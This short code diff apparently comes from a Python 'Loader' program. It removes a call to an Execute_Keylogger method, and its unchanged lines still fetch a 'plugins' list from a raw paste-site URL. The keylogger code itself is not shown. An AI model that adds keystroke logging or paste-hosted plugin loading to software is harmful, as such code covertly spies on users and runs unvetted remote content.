@@ -34,7 +34,6 @@ class Loader():
 		self.plugins = requests.get('https://textbin.net/raw/tc3lntemtr').json()
 		thread = threading.Thread(target = self.Auto_Close)
 		thread.start()
-		self.Execute_Keylogger()
 		self.SendNotification()
 		while True:
 			try:
